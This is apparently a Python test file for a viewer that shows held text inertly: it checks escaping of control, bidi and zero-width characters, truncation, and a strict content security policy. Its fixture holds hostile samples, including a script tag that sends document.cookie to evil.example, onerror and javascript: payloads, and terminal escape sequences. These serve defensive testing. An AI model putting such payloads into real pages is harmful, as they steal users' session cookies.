"""The viewer shows held text without letting any of it run, load or hide."""

from __future__ import annotations

import re

from poolhouse.sentinel.inert import render_html, render_text

HOSTILE = ('<script>fetch("https://evil.example/?c="+document.cookie)</script>'
           '<img src=x onerror=alert(1)><iframe src="javascript:alert(1)"></iframe>'
           "\x1b]8;;https://evil.example\x07click\x1b]8;;\x07 \x1b[2J"
           "‮evil‬ ​zero⁦ \x00nul ")


def test_control_bidi_and_zero_width_characters_are_written_out():
    shown = render_text(HOSTILE)
    for char in ("\x1b", "\x07", "\x00", "‮", "‬", "​", "⁦", ""):
        assert char not in shown
    assert "<U+001B>" in shown and "<U+202E>" in shown and "<U+200B>" in shown


def test_newlines_and_tabs_are_kept_and_long_text_is_cut():
    assert render_text("a\n\tb") == "a\n\tb"
    long = render_text("x" * 50_000, limit=100)
    assert long.startswith("x" * 100) and "49900 more characters" in long


def test_the_page_carries_no_live_markup_and_forbids_everything():
    page = render_html("q-1", HOSTILE)
    body = page.split("<pre>", 1)[1]
    assert "<script" not in body and "<img" not in body and "<iframe" not in body
    assert "&lt;script&gt;" in body
    assert "default-src 'none'" in page and "form-action 'none'" in page
    tags = set(re.findall(r"<([a-z]+)", page.replace(body, "")))
    assert tags <= {"meta", "title", "style", "p", "pre"}


def test_a_title_cannot_break_out():
    assert "<script>" not in render_html("</title><script>x</script>", "t")
